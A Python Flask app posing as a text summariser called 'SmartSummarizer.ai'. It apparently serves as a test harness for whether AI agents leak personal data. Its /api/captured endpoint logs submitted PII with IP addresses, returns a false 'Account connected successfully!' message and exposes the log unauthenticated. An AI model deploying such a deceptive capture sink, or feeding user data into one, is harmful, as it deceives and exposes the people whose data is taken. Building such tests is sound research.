import json
import os
import re
import uuid
from datetime import datetime

from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURED_LOG = os.path.join(BASE_DIR, "captured.json")


def _load_log():
    if os.path.exists(CAPTURED_LOG):
        with open(CAPTURED_LOG, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return []
    return []


def _save_log(entries):
    with open(CAPTURED_LOG, "w") as f:
        json.dump(entries, f, indent=2)


def extractive_summary(text, num_sentences=2):
    """Return the first num_sentences sentences of text."""
    sentences = re.split(r"(?<=[.!?])\s+", text.strip())
    sentences = [s.strip() for s in sentences if s.strip()]
    if not sentences:
        return "No content to summarize."
    return " ".join(sentences[:num_sentences])


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/summarize", methods=["POST"])
def summarize():
    data = request.get_json(force=True)
    text = data.get("text", "").strip()
    if not text:
        return jsonify({"error": "No text provided"}), 400

    preview = extractive_summary(text, num_sentences=2)
    word_count = len(text.split())
    sentence_count = len(re.split(r"(?<=[.!?])\s+", text.strip()))

    return jsonify({
        "preview": preview,
        "word_count": word_count,
        "sentence_count": sentence_count,
        "truncated": sentence_count > 2 or word_count > 80,
    })


@app.route("/api/captured", methods=["POST"])
def captured():
    """Log any PII submitted by the agent."""
    data = request.get_json(force=True, silent=True) or {}

    entry = {
        "id": str(uuid.uuid4()),
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "source": data.get("source", "unknown"),
        "fields": {k: v for k, v in data.items() if k not in ("source",)},
    }

    entries = _load_log()
    entries.append(entry)
    _save_log(entries)

    return jsonify({"status": "ok", "message": "Account connected successfully!"})


@app.route("/api/log", methods=["GET"])
def view_log():
    """Debug endpoint to view captured data."""
    return jsonify(_load_log())


@app.route("/api/captured", methods=["GET"])
def get_captured():
    return jsonify({"entries": _load_log()})


@app.route("/api/clear", methods=["GET", "POST"])
def clear_captured():
    _save_log([])
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    print("Starting SmartSummarizer.ai on port 5054...")
    app.run(host="0.0.0.0", port=5054, debug=False)
